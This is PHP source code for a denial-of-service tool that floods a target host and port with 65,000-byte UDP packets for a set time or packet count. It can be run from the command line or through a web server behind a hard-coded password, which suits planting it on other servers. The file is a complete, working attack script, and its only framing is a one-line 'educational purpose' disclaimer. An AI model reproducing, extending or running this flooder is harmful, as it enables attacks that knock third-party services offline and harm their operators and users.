<?php
/**
 * Script to perform a DDoS UDP Flood by PHP
 * 
 * This tool is written on educational purpose, please use it on your own good faith.
 * 
 * GNU General Public License version 2.0 (GPLv2)
 * @version	0.1
 */

define('DDOS_VERSION','0.1');

// Password to be used when the script is executed from the webserver
define('DDOS_PASSWORD','pass');

// Default packet size
define('DDOS_PACKET_SIZE',65000);

/**
 * Script initializer
 */
function init() {

	// Start output buffer
	ob_start();
	
	// Send content type as plain text, just to avoid writing
	// different output for web and cli
	if(!is_cli()) {
		header("Content-Type: text/plain");
	}
	println();
}


/**
 * Prints a message with a carriage return
 * @param string 	$message Message to print
 * @param integer 	$indent Number of tabs to print before the message
 */
function println($message = '',$indent = 0) {
	if($indent) {
		echo str_repeat("\t", (int) $indent);
	}
	echo $message . "\n";
	
	// Flush the output buffer
	ob_flush();
	flush();
}

/**
 * Prints the script usage
 */
function usage() {
	println();
	println('DDoS PHP Script, version '.DDOS_VERSION);
	println();
	println("Usage:");
	println("from terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER");
	println("from webserver: http://localhost/ddos.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER");
	println();
	println("PARAMETERS");
	println("----------");
	println("host	REQUIRED, specify IP or HOSTNAME");
	println("pass	REQUIRED, only if used from webserver");
	println("port	OPTIONAL, if not specified a random port will be selected");
	println("time	OPTIONAL, seconds to keep the DDoS alive, required if packet is not used");
	println("packet	OPTIONAL, number of packets to send to the target, required if time is not used");
	println();
	println("Note: 	If both time and packet are used, only time will be used");
	println();
	println("More information on https://github.com/drego85/DDoS-PHP-Script");
}


/**
 * Check if we are running the script from terminal or from a web server
 * @return boolean
 */
function is_cli() {
	return php_sapi_name() == 'cli';
}

/**
 * UDP Connect
 * @param string 	$h Host name or ip address
 * @param integer 	$p Port number
 * @param integer 	$ps Packet size
 * @return boolean	True if the packet was sent
 */
function udp_connect($h,$p,$ps){

	$out = str_repeat("0", $ps);
	
	$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
	
	if(!$fp) {
		println("UDP ERROR, $errstr ($errno)");
		$ret = false;
	}
	else {
		@fwrite($fp, $out);
		fclose($fp);
		$ret = true;
	}
	
	return $ret;
}

/**
 * Sanitize the port number or return a random one
 * @param integer 	$port
 * @return integer 	Port number or random port
 */
function get_port($port = 0){
	$port = intval($port);
	return ($port >= 1 &&  $port <= 65535) ? $port : rand(1,65535);
}



/* SCRIPT START HERE */
init();

$params = array(
	'host' => 	'',
	'port' => 	'',
	'packet' => '',
	'time'	=> 	'',
	'pass'	=> 	''
);


// Parse the params
if(is_cli()) {
    parse_str(implode('&', array_slice($argv, 1)), $args);
	$params = array_merge($params,$args);
}
else {
	foreach($_GET as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8'); 
	}
}

// Verify if params are correct
if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($params['packet'])){
	
	// If executed from CLI no password
	if(!is_cli()){
		if(!empty($params['pass'])){
			if (md5($params['pass']) !== md5(DDOS_PASSWORD)) { 
				println("Wrong password!"); 
				// Maybe it is a good idea to hide usage here
				// usage(); 
				exit(1);
			}
		}
		else{
			println("ERROR, You need to specify the password to use this script from web!");
			// Maybe it is a good idea to hide usage here
			// usage(); 
			exit(1);
		}
	}
	
	$packets = 0; 
	$host = $params['host'];
	$port = get_port($params['port']);
	
	//TODO Add a param for the packet size
	$packet_size = DDOS_PACKET_SIZE;
	
	// Time based attack
	if($params['time']){
		$exec_time = $params['time']; 
		$max_time = time() + $exec_time; 
		
		while(time() < $max_time){
			$packets++;
			if(udp_connect($host,$port,$packet_size)) {
				println("Sending packet #".$packets);
			}
		}
		$timeStr = $exec_time. " seconds";
	}
	// Packet number based attack
	else {
		$max_packet = $params['packet'];
		$start_time=time();
		
		while($packets < $max_packet){
			$packets++;
			if(udp_connect($host,$port,$packet_size)) {
				println("Sending packet #".$packets);
			}
		}
		$exec_time = time() - $start_time;

		// If the script end before 1 sec, all the packets were sent in 1 sec
		if($exec_time==0){
			$exec_time=1;
			$timeStr = "less than a second";
		}
		else {
			$timeStr = "about " . $exec_time . " seconds";
		}
	}
	
	println();
	println("DDoS UDP flood completed"); 
	println('Host: ' . $host);
	println('Port: '. $port);
	println("Packets: " .$packets .'/'.round((($packets*$packet_size)/1024)/1024, 2). ' MB');
	println("Duration: " .$timeStr);
	println("Avarage: " . round($packets/$exec_time, 2).' packet/second');
	println();
	exit;
	
}
else { 
	println("ERROR, Missing or wrong parameters!");
	usage();
}
// End and clean the buffer output
ob_end_flush();
?>